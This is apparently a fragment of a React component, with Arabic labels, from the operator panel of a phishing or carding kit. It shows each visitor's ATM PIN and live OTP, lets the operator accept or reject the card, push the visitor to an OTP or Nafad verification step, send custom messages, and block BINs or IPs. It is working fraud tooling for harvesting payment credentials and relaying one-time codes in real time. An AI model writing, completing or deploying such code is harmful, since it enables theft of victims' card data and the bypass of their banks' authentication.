          <div className="flex items-center gap-2">
            {atmPin && (
              <span className="font-mono font-bold text-slate-800 bg-white px-2 py-0.5 rounded border border-slate-200" dir="ltr">
                PIN: {atmPin}
              </span>
            )}
            {currentOtp && (
              <span className="font-mono font-bold text-blue-700 bg-blue-50 px-2 py-0.5 rounded border border-blue-200" dir="ltr">
                OTP: {currentOtp}
              </span>
            )}
          </div>
          <span className="font-semibold text-blue-600 underline underline-offset-2">
            {visitor.cardApprovalStatus === "approved"
              ? "مقبول"
              : visitor.cardApprovalStatus === "rejected"
                ? "مرفوض"
                : "منقول"}
          </span>
        </div>

        {/* Action buttons */}
        <div className="grid grid-cols-2 gap-1.5 pt-1">
          <button
            onClick={() => onApprove("cardApprovalStatus")}
            disabled={!waiting}
            className="py-1.5 bg-emerald-600 text-white hover:bg-emerald-500 disabled:opacity-40 rounded-md text-xs font-semibold flex items-center justify-center gap-1"
            data-testid="card-accept"
          >
            <CheckCircle2 className="w-3.5 h-3.5" /> قبول
          </button>
          <button
            onClick={() => onReject("cardApprovalStatus")}
            disabled={!waiting}
            className="py-1.5 bg-red-600 text-white hover:bg-red-500 disabled:opacity-40 rounded-md text-xs font-semibold flex items-center justify-center gap-1"
            data-testid="card-reject"
          >
            <XCircle className="w-3.5 h-3.5" /> رفض
          </button>
          <button
            onClick={() => onPushStep(5)}
            className="col-span-2 py-1.5 bg-white hover:bg-slate-50 text-slate-700 border border-slate-300 rounded-md text-xs font-semibold flex items-center justify-center gap-1"
          >
            <Hash className="w-3 h-3" /> دفع إلى OTP
          </button>
        </div>
        <BankContactPushRow visitor={visitor} />
        <CustomMessagePushRow visitor={visitor} />

        {/* Quick block-BIN action */}
        {hasBin && bin && onBlockBin && (
          <button
            onClick={() => {
              if (isBinBlocked) return;
              if (
                confirm(
                  `حظر جميع البطاقات التي تبدأ بـ ${bin}؟\nسيمنع أي زائر من استخدام بطاقة بنفس البداية.`
                )
              ) {
                onBlockBin(String(bin));
              }
            }}
            disabled={isBinBlocked}
            className={`w-full py-1.5 rounded-md text-[11px] font-bold flex items-center justify-center gap-1.5 border transition ${
              isBinBlocked
                ? "bg-red-50 text-red-400 border-red-200 cursor-not-allowed"
                : "bg-white text-red-600 hover:bg-red-50 border-red-200"
            }`}
            data-testid="card-block-bin"
          >
            <Ban className="w-3.5 h-3.5" />
            {isBinBlocked ? "محظور بالفعل" : `حظر هذا الـ BIN (${bin})`}
          </button>
        )}

        {/* Quick block-IP action */}
        {(visitor.ip || visitor.ipAddress) && onBlockIp && (
          <button
            onClick={() => {
              const ip = String(visitor.ip || visitor.ipAddress);
              if (isIpBlocked) return;
              if (
                confirm(
                  `حظر هذا الزائر بعنوان IP ${ip}؟\nسيمنع الدخول من هذا العنوان نهائياً.`
                )
              ) {
                onBlockIp(ip);
              }
            }}
            disabled={isIpBlocked}
            className={`w-full py-1.5 rounded-md text-[11px] font-bold flex items-center justify-center gap-1.5 border transition ${
              isIpBlocked
                ? "bg-red-50 text-red-400 border-red-200 cursor-not-allowed"
                : "bg-white text-red-600 hover:bg-red-50 border-red-200"
            }`}
            data-testid="card-block-ip"
          >
            <WifiOff className="w-3.5 h-3.5" />
            {isIpBlocked
              ? "IP محظور بالفعل"
              : `حظر بالـ IP (${visitor.ip || visitor.ipAddress})`}
          </button>
        )}

        {/* Nafad code + approval */}
        {(isFinalStep(visitor) ||
          visitor.nafadConfirmationStatus === "waiting") && (
          <NafadControl
            visitor={visitor}
            onApprove={onApprove}
            onReject={onReject}
          />
        )}
      </div>
    </Panel>
  );
}

